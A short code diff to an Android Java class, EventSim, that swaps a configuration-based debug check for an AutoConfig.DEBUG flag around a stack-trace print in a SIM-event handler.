@@ -16,6 +16,7 @@ import android.util.Log;
 import com.android.service.Device;
 import com.android.service.Sim;
 import com.android.service.agent.AgentType;
+import com.android.service.auto.AutoConfig;
 import com.android.service.conf.Configuration;
 import com.android.service.evidence.Markup;
 import com.android.service.interfaces.Observer;
@@ -75,7 +76,7 @@ public class EventSim extends EventBase implements Observer<Sim> {
 					onEnter();
 				}
 			} catch (IOException e) {
-				if(Configuration.isDebug()) { e.printStackTrace(); }
+				if(AutoConfig.DEBUG) { e.printStackTrace(); }
 			}
 		} else {
 			String imsi = Device.self().getImsi();
